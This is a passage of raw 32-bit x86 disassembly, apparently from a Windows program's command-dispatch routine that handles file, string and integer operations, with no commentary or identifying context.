  4016a9:	33 c9                	xor    %ecx,%ecx
  4016ab:	e8 8a fd ff ff       	call   0x40143a
  4016b0:	83 f8 01             	cmp    $0x1,%eax
  4016b3:	89 55 1c             	mov    %edx,0x1c(%ebp)
  4016b6:	7f 03                	jg     0x4016bb
  4016b8:	33 c0                	xor    %eax,%eax
  4016ba:	40                   	inc    %eax
  4016bb:	50                   	push   %eax
  4016bc:	ff 15 f4 90 40 00    	call   *0x4090f4
  4016c2:	e9 a6 18 00 00       	jmp    0x402f6d
  4016c7:	52                   	push   %edx
  4016c8:	ff 15 44 92 40 00    	call   *0x409244
  4016ce:	e9 9a 18 00 00       	jmp    0x402f6d
  4016d3:	33 d2                	xor    %edx,%edx
  4016d5:	39 55 4c             	cmp    %edx,0x4c(%ebp)
  4016d8:	7f 39                	jg     0x401713
  4016da:	7d 0e                	jge    0x4016ea
  4016dc:	8b 04 85 40 a6 42 00 	mov    0x42a640(,%eax,4),%eax
  4016e3:	a3 68 d9 40 00       	mov    %eax,0x40d968
  4016e8:	eb 0f                	jmp    0x4016f9
  4016ea:	c1 e0 02             	shl    $0x2,%eax
  4016ed:	8b 88 40 a6 42 00    	mov    0x42a640(%eax),%ecx
  4016f3:	89 88 00 a6 42 00    	mov    %ecx,0x42a600(%eax)
  4016f9:	33 c9                	xor    %ecx,%ecx
  4016fb:	41                   	inc    %ecx
  4016fc:	e8 39 fd ff ff       	call   0x40143a
  401701:	8b 4d 44             	mov    0x44(%ebp),%ecx
  401704:	89 55 1c             	mov    %edx,0x1c(%ebp)
  401707:	89 04 8d 40 a6 42 00 	mov    %eax,0x42a640(,%ecx,4)
  40170e:	e9 5a 18 00 00       	jmp    0x402f6d
  401713:	c1 e0 02             	shl    $0x2,%eax
  401716:	39 55 50             	cmp    %edx,0x50(%ebp)
  401719:	8d 88 40 a6 42 00    	lea    0x42a640(%eax),%ecx
  40171f:	8b 80 00 a6 42 00    	mov    0x42a600(%eax),%eax
  401725:	89 01                	mov    %eax,(%ecx)
  401727:	0f 8d 40 18 00 00    	jge    0x402f6d
  40172d:	a1 68 d9 40 00       	mov    0x40d968,%eax
  401732:	89 01                	mov    %eax,(%ecx)
  401734:	e9 34 18 00 00       	jmp    0x402f6d
  401739:	8b 75 4c             	mov    0x4c(%ebp),%esi
  40173c:	8d 34 b5 40 a6 42 00 	lea    0x42a640(,%esi,4),%esi
  401743:	8b 0e                	mov    (%esi),%ecx
  401745:	33 c0                	xor    %eax,%eax
  401747:	85 c9                	test   %ecx,%ecx
  401749:	0f 94 c0             	sete   %al
  40174c:	23 4d 50             	and    0x50(%ebp),%ecx
  40174f:	89 0e                	mov    %ecx,(%esi)
  401751:	8b 44 85 44          	mov    0x44(%ebp,%eax,4),%eax
  401755:	e9 1e 18 00 00       	jmp    0x402f78
  40175a:	8b 45 48             	mov    0x48(%ebp),%eax
  40175d:	ff 34 85 40 a6 42 00 	push   0x42a640(,%eax,4)
  401764:	53                   	push   %ebx
  401765:	e8 a4 4c 00 00       	call   0x40640e
  40176a:	e9 fe 17 00 00       	jmp    0x402f6d
  40176f:	8b 0d 60 95 42 00    	mov    0x429560,%ecx
  401775:	85 c9                	test   %ecx,%ecx
  401777:	8b 35 48 92 40 00    	mov    0x409248,%esi
  40177d:	74 09                	je     0x401788
  40177f:	ff 75 48             	push   0x48(%ebp)
  401782:	51                   	push   %ecx
  401783:	ff d6                	call   *%esi
  401785:	8b 45 44             	mov    0x44(%ebp),%eax
  401788:	8b 0d 4c 95 42 00    	mov    0x42954c,%ecx
  40178e:	85 c9                	test   %ecx,%ecx
  401790:	0f 84 d7 17 00 00    	je     0x402f6d
  401796:	50                   	push   %eax
  401797:	51                   	push   %ecx
  401798:	ff d6                	call   *%esi
  40179a:	e9 ce 17 00 00       	jmp    0x402f6d
  40179f:	6a f0                	push   $0xfffffff0
  4017a1:	5e                   	pop    %esi
  4017a2:	e8 b0 fc ff ff       	call   0x401457
  4017a7:	ff 75 48             	push   0x48(%ebp)
  4017aa:	50                   	push   %eax
  4017ab:	ff 15 f8 90 40 00    	call   *0x4090f8
  4017b1:	85 c0                	test   %eax,%eax
  4017b3:	0f 85 b4 17 00 00    	jne    0x402f6d
  4017b9:	c7 45 70 01 00 00 00 	movl   $0x1,0x70(%ebp)
  4017c0:	e9 a8 17 00 00       	jmp    0x402f6d
  4017c5:	6a f0                	push   $0xfffffff0
  4017c7:	5e                   	pop    %esi
  4017c8:	e8 8a fc ff ff       	call   0x401457
  4017cd:	8b d8                	mov    %eax,%ebx
  4017cf:	53                   	push   %ebx
  4017d0:	e8 8f 48 00 00       	call   0x406064
  4017d5:	8b f0                	mov    %eax,%esi
  4017d7:	85 f6                	test   %esi,%esi
  4017d9:	74 56                	je     0x401831
  4017db:	6a 5c                	push   $0x5c
  4017dd:	56                   	push   %esi
  4017de:	e8 2d 48 00 00       	call   0x406010
  4017e3:	8b f0                	mov    %eax,%esi
  4017e5:	0f b7 3e             	movzwl (%esi),%edi
  4017e8:	66 83 26 00          	andw   $0x0,(%esi)
  4017ec:	66 85 ff             	test   %di,%di
  4017ef:	75 17                	jne    0x401808
  4017f1:	83 7d 4c 00          	cmpl   $0x0,0x4c(%ebp)
  4017f5:	74 11                	je     0x401808
  4017f7:	e8 5c 4f 00 00       	call   0x406758
  4017fc:	85 c0                	test   %eax,%eax
  4017fe:	74 08                	je     0x401808
  401800:	53                   	push   %ebx
  401801:	e8 b2 46 00 00       	call   0x405eb8
  401806:	eb 06                	jmp    0x40180e
  401808:	53                   	push   %ebx
  401809:	e8 04 47 00 00       	call   0x405f12
  40180e:	85 c0                	test   %eax,%eax
  401810:	74 15                	je     0x401827
  401812:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401817:	75 0b                	jne    0x401824
  401819:	53                   	push   %ebx
  40181a:	ff 15 fc 90 40 00    	call   *0x4090fc
  401820:	a8 10                	test   $0x10,%al
  401822:	75 03                	jne    0x401827
  401824:	ff 45 70             	incl   0x70(%ebp)
  401827:	66 89 3e             	mov    %di,(%esi)
  40182a:	46                   	inc    %esi
  40182b:	46                   	inc    %esi
  40182c:	66 85 ff             	test   %di,%di
  40182f:	75 aa                	jne    0x4017db
  401831:	83 7d 48 00          	cmpl   $0x0,0x48(%ebp)
  401835:	74 29                	je     0x401860
  401837:	6a e6                	push   $0xffffffe6
  401839:	e8 eb fb ff ff       	call   0x401429
  40183e:	53                   	push   %ebx
  40183f:	68 00 60 43 00       	push   $0x436000
  401844:	e8 7e 4c 00 00       	call   0x4064c7
  401849:	53                   	push   %ebx
  40184a:	ff 15 00 91 40 00    	call   *0x409100
  401850:	85 c0                	test   %eax,%eax
  401852:	0f 85 15 17 00 00    	jne    0x402f6d
  401858:	ff 45 70             	incl   0x70(%ebp)
  40185b:	e9 0d 17 00 00       	jmp    0x402f6d
  401860:	6a f5                	push   $0xfffffff5
  401862:	e8 c2 fb ff ff       	call   0x401429
  401867:	e9 01 17 00 00       	jmp    0x402f6d
  40186c:	33 f6                	xor    %esi,%esi
  40186e:	e8 e4 fb ff ff       	call   0x401457
  401873:	50                   	push   %eax
  401874:	e8 3a 4d 00 00       	call   0x4065b3
  401879:	85 c0                	test   %eax,%eax
  40187b:	0f 84 7d 04 00 00    	je     0x401cfe
  401881:	8b 45 48             	mov    0x48(%ebp),%eax
  401884:	e9 ef 16 00 00       	jmp    0x402f78
  401889:	6a d0                	push   $0xffffffd0
  40188b:	5e                   	pop    %esi
  40188c:	e8 c6 fb ff ff       	call   0x401457
  401891:	6a df                	push   $0xffffffdf
  401893:	5e                   	pop    %esi
  401894:	8b f8                	mov    %eax,%edi
  401896:	e8 bc fb ff ff       	call   0x401457
  40189b:	6a 13                	push   $0x13
  40189d:	5e                   	pop    %esi
  40189e:	8b d8                	mov    %eax,%ebx
  4018a0:	e8 b2 fb ff ff       	call   0x401457
  4018a5:	53                   	push   %ebx
  4018a6:	57                   	push   %edi
  4018a7:	ff 15 04 91 40 00    	call   *0x409104
  4018ad:	85 c0                	test   %eax,%eax
  4018af:	74 04                	je     0x4018b5
  4018b1:	6a e3                	push   $0xffffffe3
  4018b3:	eb ad                	jmp    0x401862
  4018b5:	83 7d 4c 00          	cmpl   $0x0,0x4c(%ebp)
  4018b9:	0f 84 fa fe ff ff    	je     0x4017b9
  4018bf:	57                   	push   %edi
  4018c0:	e8 ee 4c 00 00       	call   0x4065b3
  4018c5:	85 c0                	test   %eax,%eax
  4018c7:	0f 84 ec fe ff ff    	je     0x4017b9
  4018cd:	53                   	push   %ebx
  4018ce:	57                   	push   %edi
  4018cf:	e8 fd 53 00 00       	call   0x406cd1
  4018d4:	6a e4                	push   $0xffffffe4
  4018d6:	eb 8a                	jmp    0x401862
  4018d8:	33 f6                	xor    %esi,%esi
  4018da:	e8 78 fb ff ff       	call   0x401457
  4018df:	8b 7d 6c             	mov    0x6c(%ebp),%edi
  4018e2:	8b f0                	mov    %eax,%esi
  4018e4:	8d 45 7c             	lea    0x7c(%ebp),%eax
  4018e7:	50                   	push   %eax
  4018e8:	57                   	push   %edi
  4018e9:	bb 00 04 00 00       	mov    $0x400,%ebx
  4018ee:	53                   	push   %ebx
  4018ef:	56                   	push   %esi
  4018f0:	ff 15 08 91 40 00    	call   *0x409108
  4018f6:	85 c0                	test   %eax,%eax
  4018f8:	74 25                	je     0x40191f
  4018fa:	8b 45 7c             	mov    0x7c(%ebp),%eax
  4018fd:	3b c6                	cmp    %esi,%eax
  4018ff:	76 29                	jbe    0x40192a
  401901:	66 83 38 00          	cmpw   $0x0,(%eax)
  401905:	74 23                	je     0x40192a
  401907:	56                   	push   %esi
  401908:	e8 a6 4c 00 00       	call   0x4065b3
  40190d:	85 c0                	test   %eax,%eax
  40190f:	74 0e                	je     0x40191f
  401911:	83 c0 2c             	add    $0x2c,%eax
  401914:	50                   	push   %eax
  401915:	ff 75 7c             	push   0x7c(%ebp)
  401918:	e8 aa 4b 00 00       	call   0x4064c7
  40191d:	eb 0b                	jmp    0x40192a
  40191f:	66 83 27 00          	andw   $0x0,(%edi)
  401923:	c7 45 70 01 00 00 00 	movl   $0x1,0x70(%ebp)
  40192a:	83 7d 4c 00          	cmpl   $0x0,0x4c(%ebp)
  40192e:	0f 85 39 16 00 00    	jne    0x402f6d
  401934:	53                   	push   %ebx
  401935:	57                   	push   %edi
  401936:	57                   	push   %edi
  401937:	ff 15 0c 91 40 00    	call   *0x40910c
  40193d:	e9 2b 16 00 00       	jmp    0x402f6d
  401942:	83 ce ff             	or     $0xffffffff,%esi
  401945:	e8 0d fb ff ff       	call   0x401457
  40194a:	8d 4d 7c             	lea    0x7c(%ebp),%ecx
  40194d:	51                   	push   %ecx
  40194e:	53                   	push   %ebx
  40194f:	68 00 04 00 00       	push   $0x400
  401954:	6a 00                	push   $0x0
  401956:	50                   	push   %eax
  401957:	6a 00                	push   $0x0
  401959:	ff 15 10 91 40 00    	call   *0x409110
  40195f:	85 c0                	test   %eax,%eax
  401961:	0f 85 06 16 00 00    	jne    0x402f6d
  401967:	66 83 23 00          	andw   $0x0,(%ebx)
  40196b:	c7 45 70 01 00 00 00 	movl   $0x1,0x70(%ebp)
  401972:	e9 f6 15 00 00       	jmp    0x402f6d
  401977:	6a ef                	push   $0xffffffef
  401979:	5e                   	pop    %esi
  40197a:	e8 d8 fa ff ff       	call   0x401457
  40197f:	50                   	push   %eax
  401980:	53                   	push   %ebx
  401981:	e8 0a 48 00 00       	call   0x406190
  401986:	e9 26 fe ff ff       	jmp    0x4017b1
  40198b:	6a 31                	push   $0x31
  40198d:	5e                   	pop    %esi
  40198e:	e8 c4 fa ff ff       	call   0x401457
  401993:	8b f0                	mov    %eax,%esi
  401995:	8b 45 44             	mov    0x44(%ebp),%eax
  401998:	83 e0 07             	and    $0x7,%eax
  40199b:	56                   	push   %esi
  40199c:	89 75 68             	mov    %esi,0x68(%ebp)
  40199f:	89 45 7c             	mov    %eax,0x7c(%ebp)
  4019a2:	e8 88 46 00 00       	call   0x40602f
  4019a7:	85 c0                	test   %eax,%eax
  4019a9:	56                   	push   %esi
  4019aa:	be 68 b1 40 00       	mov    $0x40b168,%esi
  4019af:	74 08                	je     0x4019b9
  4019b1:	56                   	push   %esi
  4019b2:	e8 10 4b 00 00       	call   0x4064c7
  4019b7:	eb 17                	jmp    0x4019d0
  4019b9:	68 00 60 43 00       	push   $0x436000
  4019be:	56                   	push   %esi
  4019bf:	e8 03 4b 00 00       	call   0x4064c7
  4019c4:	50                   	push   %eax
  4019c5:	e8 ee 4d 00 00       	call   0x4067b8
  4019ca:	50                   	push   %eax
  4019cb:	e8 13 4b 00 00       	call   0x4064e3
  4019d0:	56                   	push   %esi
  4019d1:	e8 2e 4b 00 00       	call   0x406504
  4019d6:	bb 68 c1 40 00       	mov    $0x40c168,%ebx
  4019db:	83 7d 7c 03          	cmpl   $0x3,0x7c(%ebp)
  4019df:	7c 31                	jl     0x401a12
  4019e1:	56                   	push   %esi
  4019e2:	e8 cc 4b 00 00       	call   0x4065b3
  4019e7:	33 c9                	xor    %ecx,%ecx
  4019e9:	85 c0                	test   %eax,%eax
  4019eb:	74 10                	je     0x4019fd
  4019ed:	8d 4d 54             	lea    0x54(%ebp),%ecx
  4019f0:	51                   	push   %ecx
  4019f1:	83 c0 14             	add    $0x14,%eax
  4019f4:	50                   	push   %eax
  4019f5:	ff 15 14 91 40 00    	call   *0x409114
  4019fb:	8b c8                	mov    %eax,%ecx
  4019fd:	8b 45 7c             	mov    0x7c(%ebp),%eax
  401a00:	83 c0 fd             	add    $0xfffffffd,%eax
  401a03:	0d 00 00 00 80       	or     $0x80000000,%eax
  401a08:	23 c1                	and    %ecx,%eax
  401a0a:	f7 d8                	neg    %eax
  401a0c:	1b c0                	sbb    %eax,%eax
  401a0e:	40                   	inc    %eax
  401a0f:	89 45 7c             	mov    %eax,0x7c(%ebp)
  401a12:	83 7d 7c 00          	cmpl   $0x0,0x7c(%ebp)
  401a16:	75 06                	jne    0x401a1e
  401a18:	56                   	push   %esi
  401a19:	e8 1d 47 00 00       	call   0x40613b
  401a1e:	33 c0                	xor    %eax,%eax
  401a20:	83 7d 7c 01          	cmpl   $0x1,0x7c(%ebp)
  401a24:	0f 95 c0             	setne  %al
  401a27:	40                   	inc    %eax
  401a28:	50                   	push   %eax
  401a29:	68 00 00 00 40       	push   $0x40000000
  401a2e:	56                   	push   %esi
  401a2f:	e8 2d 47 00 00       	call   0x406161
  401a34:	83 f8 ff             	cmp    $0xffffffff,%eax
  401a37:	89 45 2c             	mov    %eax,0x2c(%ebp)
  401a3a:	75 6b                	jne    0x401aa7
  401a3c:	83 7d 7c 00          	cmpl   $0x0,0x7c(%ebp)
  401a40:	75 47                	jne    0x401a89
  401a42:	57                   	push   %edi
  401a43:	53                   	push   %ebx
  401a44:	e8 7e 4a 00 00       	call   0x4064c7
  401a49:	56                   	push   %esi
  401a4a:	57                   	push   %edi
  401a4b:	e8 77 4a 00 00       	call   0x4064c7
  401a50:	ff 75 5c             	push   0x5c(%ebp)
  401a53:	68 68 b9 40 00       	push   $0x40b968
  401a58:	e8 84 4e 00 00       	call   0x4068e1
  401a5d:	53                   	push   %ebx
  401a5e:	57                   	push   %edi
  401a5f:	e8 63 4a 00 00       	call   0x4064c7
  401a64:	8b 45 44             	mov    0x44(%ebp),%eax
  401a67:	c1 f8 03             	sar    $0x3,%eax
  401a6a:	50                   	push   %eax
  401a6b:	68 68 b9 40 00       	push   $0x40b968
  401a70:	e8 37 45 00 00       	call   0x405fac
  401a75:	83 e8 04             	sub    $0x4,%eax
  401a78:	0f 84 5d ff ff ff    	je     0x4019db
  401a7e:	48                   	dec    %eax
  401a7f:	74 1b                	je     0x401a9c
  401a81:	56                   	push   %esi
  401a82:	6a fa                	push   $0xfffffffa
  401a84:	e9 dc fb ff ff       	jmp    0x401665
  401a89:	ff 75 68             	push   0x68(%ebp)
  401a8c:	6a e2                	push   $0xffffffe2
  401a8e:	e8 ab 37 00 00       	call   0x40523e
  401a93:	83 7d 7c 02          	cmpl   $0x2,0x7c(%ebp)
  401a97:	e9 17 fd ff ff       	jmp    0x4017b3
  401a9c:	ff 05 48 a6 42 00    	incl   0x42a648
  401aa2:	e9 cf 14 00 00       	jmp    0x402f76
  401aa7:	ff 75 68             	push   0x68(%ebp)
  401aaa:	6a ea                	push   $0xffffffea
  401aac:	e8 8d 37 00 00       	call   0x40523e
  401ab1:	ff 75 60             	push   0x60(%ebp)
  401ab4:	8b 4d 50             	mov    0x50(%ebp),%ecx
  401ab7:	8b 45 4c             	mov    0x4c(%ebp),%eax
  401aba:	ff 05 74 a6 42 00    	incl   0x42a674
  401ac0:	33 ff                	xor    %edi,%edi
  401ac2:	83 7d 40 15          	cmpl   $0x15,0x40(%ebp)
  401ac6:	57                   	push   %edi
  401ac7:	57                   	push   %edi
  401ac8:	ff 75 2c             	push   0x2c(%ebp)
  401acb:	51                   	push   %ecx
  401acc:	50                   	push   %eax
  401acd:	75 04                	jne    0x401ad3
  401acf:	6a 01                	push   $0x1
  401ad1:	eb 01                	jmp    0x401ad4
  401ad3:	57                   	push   %edi
  401ad4:	e8 47 18 00 00       	call   0x403320
  401ad9:	ff 0d 74 a6 42 00    	decl   0x42a674
  401adf:	83 7d 54 ff          	cmpl   $0xffffffff,0x54(%ebp)
  401ae3:	8b da                	mov    %edx,%ebx
  401ae5:	89 45 18             	mov    %eax,0x18(%ebp)
  401ae8:	75 06                	jne    0x401af0
  401aea:	83 7d 58 ff          	cmpl   $0xffffffff,0x58(%ebp)
  401aee:	74 0f                	je     0x401aff
  401af0:	8d 45 54             	lea    0x54(%ebp),%eax
  401af3:	50                   	push   %eax
  401af4:	57                   	push   %edi
  401af5:	50                   	push   %eax
  401af6:	ff 75 2c             	push   0x2c(%ebp)
  401af9:	ff 15 18 91 40 00    	call   *0x409118
  401aff:	ff 75 2c             	push   0x2c(%ebp)
  401b02:	ff 15 1c 91 40 00    	call   *0x40911c
  401b08:	3b df                	cmp    %edi,%ebx
  401b0a:	0f 8f 5d 14 00 00    	jg     0x402f6d
  401b10:	7c 0a                	jl     0x401b1c
  401b12:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  401b16:	0f 83 51 14 00 00    	jae    0x402f6d
  401b1c:	83 7d 18 fe          	cmpl   $0xfffffffe,0x18(%ebp)
  401b20:	75 18                	jne    0x401b3a
  401b22:	83 fb ff             	cmp    $0xffffffff,%ebx
  401b25:	75 13                	jne    0x401b3a
  401b27:	6a e9                	push   $0xffffffe9
  401b29:	56                   	push   %esi
  401b2a:	e8 b2 4d 00 00       	call   0x4068e1
  401b2f:	ff 75 68             	push   0x68(%ebp)
  401b32:	56                   	push   %esi
  401b33:	e8 ab 49 00 00       	call   0x4064e3
  401b38:	eb 08                	jmp    0x401b42
  401b3a:	6a ee                	push   $0xffffffee
  401b3c:	56                   	push   %esi
  401b3d:	e8 9f 4d 00 00       	call   0x4068e1
  401b42:	68 10 00 20 00       	push   $0x200010
  401b47:	56                   	push   %esi
  401b48:	e8 5f 44 00 00       	call   0x405fac
  401b4d:	e9 18 fb ff ff       	jmp    0x40166a
  401b52:	83 3d 14 b0 40 00 ff 	cmpl   $0xffffffff,0x40b014
  401b59:	c7 45 70 01 00 00 00 	movl   $0x1,0x70(%ebp)
  401b60:	74 09                	je     0x401b6b
  401b62:	83 3d e0 a5 42 00 00 	cmpl   $0x0,0x42a5e0
  401b69:	eb 68                	jmp    0x401bd3
  401b6b:	83 3d e0 a5 42 00 00 	cmpl   $0x0,0x42a5e0
  401b72:	0f 84 f5 13 00 00    	je     0x402f6d
  401b78:	33 f6                	xor    %esi,%esi
  401b7a:	e8 d8 f8 ff ff       	call   0x401457
  401b7f:	8b f8                	mov    %eax,%edi
  401b81:	57                   	push   %edi
  401b82:	e8 a8 44 00 00       	call   0x40602f
  401b87:	85 c0                	test   %eax,%eax
  401b89:	75 2d                	jne    0x401bb8
  401b8b:	68 00 88 43 00       	push   $0x438800
  401b90:	be 68 b9 40 00       	mov    $0x40b968,%esi
  401b95:	56                   	push   %esi
  401b96:	e8 2c 49 00 00       	call   0x4064c7
  401b9b:	56                   	push   %esi
  401b9c:	e8 72 4c 00 00       	call   0x406813
  401ba1:	50                   	push   %eax
  401ba2:	56                   	push   %esi
  401ba3:	e8 1f 49 00 00       	call   0x4064c7
  401ba8:	56                   	push   %esi
  401ba9:	68 cc 92 40 00       	push   $0x4092cc
  401bae:	57                   	push   %edi
  401baf:	ff 15 4c 92 40 00    	call   *0x40924c
  401bb5:	83 c4 0c             	add    $0xc,%esp
  401bb8:	57                   	push   %edi
  401bb9:	e8 46 49 00 00       	call   0x406504
  401bbe:	6a 03                	push   $0x3
  401bc0:	68 00 00 00 80       	push   $0x80000000
  401bc5:	57                   	push   %edi
  401bc6:	e8 96 45 00 00       	call   0x406161
  401bcb:	a3 14 b0 40 00       	mov    %eax,0x40b014
  401bd0:	83 f8 ff             	cmp    $0xffffffff,%eax
  401bd3:	0f 84 94 13 00 00    	je     0x402f6d
  401bd9:	83 65 70 00          	andl   $0x0,0x70(%ebp)
  401bdd:	e9 8b 13 00 00       	jmp    0x402f6d
  401be2:	33 f6                	xor    %esi,%esi
  401be4:	e8 6e f8 ff ff       	call   0x401457
  401be9:	ff 75 48             	push   0x48(%ebp)
  401bec:	50                   	push   %eax
  401bed:	e8 0b 51 00 00       	call   0x406cfd
  401bf2:	e9 76 13 00 00       	jmp    0x402f6d
  401bf7:	6a 31                	push   $0x31
  401bf9:	5e                   	pop    %esi
  401bfa:	e8 58 f8 ff ff       	call   0x401457
  401bff:	ff 75 44             	push   0x44(%ebp)
  401c02:	50                   	push   %eax
  401c03:	e8 a4 43 00 00       	call   0x405fac
  401c08:	85 c0                	test   %eax,%eax
  401c0a:	0f 84 a9 fb ff ff    	je     0x4017b9
  401c10:	3b 45 4c             	cmp    0x4c(%ebp),%eax
  401c13:	75 08                	jne    0x401c1d
  401c15:	8b 45 50             	mov    0x50(%ebp),%eax
  401c18:	e9 5b 13 00 00       	jmp    0x402f78
  401c1d:	3b 45 54             	cmp    0x54(%ebp),%eax
  401c20:	0f 85 47 13 00 00    	jne    0x402f6d
  401c26:	8b 45 58             	mov    0x58(%ebp),%eax
  401c29:	e9 4a 13 00 00       	jmp    0x402f78
  401c2e:	6a f0                	push   $0xfffffff0
  401c30:	5e                   	pop    %esi
  401c31:	eb b1                	jmp    0x401be4
  401c33:	33 f6                	xor    %esi,%esi
  401c35:	46                   	inc    %esi
  401c36:	e8 1c f8 ff ff       	call   0x401457
  401c3b:	50                   	push   %eax
  401c3c:	e8 9c 48 00 00       	call   0x4064dd
  401c41:	50                   	push   %eax
  401c42:	e9 1d fb ff ff       	jmp    0x401764
  401c47:	6a 02                	push   $0x2
  401c49:	59                   	pop    %ecx
  401c4a:	e8 eb f7 ff ff       	call   0x40143a
  401c4f:	6a 03                	push   $0x3
  401c51:	59                   	pop    %ecx
  401c52:	8b f0                	mov    %eax,%esi
  401c54:	89 55 34             	mov    %edx,0x34(%ebp)
  401c57:	e8 de f7 ff ff       	call   0x40143a
  401c5c:	89 75 7c             	mov    %esi,0x7c(%ebp)
  401c5f:	33 f6                	xor    %esi,%esi
  401c61:	46                   	inc    %esi
  401c62:	8b f8                	mov    %eax,%edi
  401c64:	89 55 1c             	mov    %edx,0x1c(%ebp)
  401c67:	e8 eb f7 ff ff       	call   0x401457
  401c6c:	50                   	push   %eax
  401c6d:	89 45 1c             	mov    %eax,0x1c(%ebp)
  401c70:	e8 68 48 00 00       	call   0x4064dd
  401c75:	66 83 23 00          	andw   $0x0,(%ebx)
  401c79:	83 7d 34 00          	cmpl   $0x0,0x34(%ebp)
  401c7d:	8b f0                	mov    %eax,%esi
  401c7f:	74 03                	je     0x401c84
  401c81:	8b 75 7c             	mov    0x7c(%ebp),%esi
  401c84:	85 f6                	test   %esi,%esi
  401c86:	0f 84 e1 12 00 00    	je     0x402f6d
  401c8c:	85 ff                	test   %edi,%edi
  401c8e:	7d 08                	jge    0x401c98
  401c90:	03 f8                	add    %eax,%edi
  401c92:	0f 88 d5 12 00 00    	js     0x402f6d
  401c98:	3b f8                	cmp    %eax,%edi
  401c9a:	7e 02                	jle    0x401c9e
  401c9c:	8b f8                	mov    %eax,%edi
  401c9e:	8b 45 1c             	mov    0x1c(%ebp),%eax
  401ca1:	8d 04 78             	lea    (%eax,%edi,2),%eax
  401ca4:	50                   	push   %eax
  401ca5:	53                   	push   %ebx
  401ca6:	e8 1c 48 00 00       	call   0x4064c7
  401cab:	85 f6                	test   %esi,%esi
  401cad:	7d 11                	jge    0x401cc0
  401caf:	53                   	push   %ebx
  401cb0:	e8 28 48 00 00       	call   0x4064dd
  401cb5:	03 f0                	add    %eax,%esi
  401cb7:	79 07                	jns    0x401cc0
  401cb9:	83 65 7c 00          	andl   $0x0,0x7c(%ebp)
  401cbd:	8b 75 7c             	mov    0x7c(%ebp),%esi
  401cc0:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  401cc6:	0f 8d a1 12 00 00    	jge    0x402f6d
  401ccc:	66 83 24 73 00       	andw   $0x0,(%ebx,%esi,2)
  401cd1:	e9 97 12 00 00       	jmp    0x402f6d
  401cd6:	6a 20                	push   $0x20
  401cd8:	5e                   	pop    %esi
  401cd9:	e8 79 f7 ff ff       	call   0x401457
  401cde:	6a 31                	push   $0x31
  401ce0:	5e                   	pop    %esi
  401ce1:	8b f8                	mov    %eax,%edi
  401ce3:	e8 6f f7 ff ff       	call   0x401457
  401ce8:	83 7d 54 00          	cmpl   $0x0,0x54(%ebp)
  401cec:	50                   	push   %eax
  401ced:	57                   	push   %edi
  401cee:	75 16                	jne    0x401d06
  401cf0:	ff 15 20 91 40 00    	call   *0x409120
  401cf6:	85 c0                	test   %eax,%eax
  401cf8:	0f 85 17 ff ff ff    	jne    0x401c15
  401cfe:	8b 45 4c             	mov    0x4c(%ebp),%eax
  401d01:	e9 72 12 00 00       	jmp    0x402f78
  401d06:	ff 15 24 91 40 00    	call   *0x409124
  401d0c:	eb e8                	jmp    0x401cf6
  401d0e:	33 f6                	xor    %esi,%esi
  401d10:	46                   	inc    %esi
  401d11:	e8 41 f7 ff ff       	call   0x401457
  401d16:	68 00 04 00 00       	push   $0x400
  401d1b:	8b f8                	mov    %eax,%edi
  401d1d:	53                   	push   %ebx
  401d1e:	57                   	push   %edi
  401d1f:	ff 15 28 91 40 00    	call   *0x409128
  401d25:	85 c0                	test   %eax,%eax
  401d27:	74 12                	je     0x401d3b
  401d29:	83 7d 4c 00          	cmpl   $0x0,0x4c(%ebp)
  401d2d:	74 13                	je     0x401d42
  401d2f:	53                   	push   %ebx
  401d30:	57                   	push   %edi
  401d31:	ff 15 24 91 40 00    	call   *0x409124
  401d37:	85 c0                	test   %eax,%eax
  401d39:	75 07                	jne    0x401d42
  401d3b:	66 83 23 00          	andw   $0x0,(%ebx)
  401d3f:	89 75 70             	mov    %esi,0x70(%ebp)
  401d42:	66 83 a3 fe 07 00 00 	andw   $0x0,0x7fe(%ebx)
  401d49:	00 
  401d4a:	e9 1e 12 00 00       	jmp    0x402f6d
  401d4f:	8b 75 58             	mov    0x58(%ebp),%esi
  401d52:	33 c9                	xor    %ecx,%ecx
  401d54:	e8 e1 f6 ff ff       	call   0x40143a
  401d59:	33 c9                	xor    %ecx,%ecx
  401d5b:	41                   	inc    %ecx
  401d5c:	8b f8                	mov    %eax,%edi
  401d5e:	89 55 1c             	mov    %edx,0x1c(%ebp)
  401d61:	e8 d4 f6 ff ff       	call   0x40143a
  401d66:	85 f6                	test   %esi,%esi
  401d68:	89 55 1c             	mov    %edx,0x1c(%ebp)
  401d6b:	75 12                	jne    0x401d7f
  401d6d:	3b f8                	cmp    %eax,%edi
  401d6f:	0f 8c a0 fe ff ff    	jl     0x401c15
  401d75:	7e 87                	jle    0x401cfe
  401d77:	8b 45 54             	mov    0x54(%ebp),%eax
  401d7a:	e9 f9 11 00 00       	jmp    0x402f78
  401d7f:	3b f8                	cmp    %eax,%edi
  401d81:	0f 82 8e fe ff ff    	jb     0x401c15
  401d87:	0f 86 71 ff ff ff    	jbe    0x401cfe
  401d8d:	eb e8                	jmp    0x401d77
  401d8f:	33 c9                	xor    %ecx,%ecx
  401d91:	41                   	inc    %ecx
  401d92:	e8 a3 f6 ff ff       	call   0x40143a
  401d97:	6a 02                	push   $0x2
  401d99:	59                   	pop    %ecx
  401d9a:	8b f0                	mov    %eax,%esi
  401d9c:	89 55 1c             	mov    %edx,0x1c(%ebp)
  401d9f:	e8 96 f6 ff ff       	call   0x40143a
  401da4:	8b c8                	mov    %eax,%ecx
  401da6:	8b 45 50             	mov    0x50(%ebp),%eax
  401da9:	83 f8 0d             	cmp    $0xd,%eax
  401dac:	89 55 1c             	mov    %edx,0x1c(%ebp)
  401daf:	77 6f                	ja     0x401e20
  401db1:	ff 24 85 9b 30 40 00 	jmp    *0x40309b(,%eax,4)
  401db8:	03 f1                	add    %ecx,%esi
  401dba:	eb 64                	jmp    0x401e20
  401dbc:	2b f1                	sub    %ecx,%esi
  401dbe:	eb 60                	jmp    0x401e20
  401dc0:	0f af ce             	imul   %esi,%ecx
  401dc3:	8b f1                	mov    %ecx,%esi
  401dc5:	eb 59                	jmp    0x401e20
  401dc7:	85 c9                	test   %ecx,%ecx
  401dc9:	74 07                	je     0x401dd2
  401dcb:	8b c6                	mov    %esi,%eax
  401dcd:	99                   	cltd
  401dce:	f7 f9                	idiv   %ecx
  401dd0:	eb 1e                	jmp    0x401df0
  401dd2:	33 f6                	xor    %esi,%esi
  401dd4:	c7 45 70 01 00 00 00 	movl   $0x1,0x70(%ebp)
  401ddb:	eb 43                	jmp    0x401e20
